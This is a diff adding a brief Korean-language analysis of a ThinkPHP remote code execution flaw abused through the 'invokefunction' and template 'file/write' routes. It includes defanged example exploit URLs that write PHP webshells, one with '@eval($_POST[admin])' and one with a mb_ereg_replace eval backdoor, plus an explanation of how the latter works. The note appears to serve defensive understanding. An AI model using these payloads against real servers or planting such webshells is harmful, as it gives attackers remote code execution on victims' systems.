@@ -1,0 +1,21 @@
+Think PHP 일부 버전에는 ‘\’문자열을 이용하여 다양한 메소드에 접근할 수 있습니다.
+공격자는 HTTP 요청을 통해 파일 template 클래스를 생성 후,
+클래스 내부 메소드(invokefunction, write)를 사용하여
+파일 쓰기 등으로 특정 기능을 수행할 것으로 예상되는 파일을 업로드할 수 있습니다.
+
+추가적으로 문자열을 변조한 원격코드를 수행할 수 있습니다
+
+hxxp://www.example.com//,/?s=index/think\app/invokefunction&function=call_
+
+hxxp://www.example.com//?s=index/\think\template\driver\file/write&cacheFile=robots1.php&content=xbshell<?php%20@eval($_POST[admin]);?>
+=>  admin파라미터 값을 실행하는 robots1.php 파일을 생성
+
+hxxp://www.example.com/?s=index/\think\template\driver\file/write&cacheFile=uknll.php&content=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?>
+=>  _파라미터 값을 실행하는 uknll.php 파일을 생성
+
+<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?>
+
+1. 찾을 패턴 = '.*'
+2. 대체할 문자 = 요청 중에서 'REQUEST' 파라미터
+3. 기준문자열 = ''(공백) 
+4. 옵션: 'e' = eval(실행)
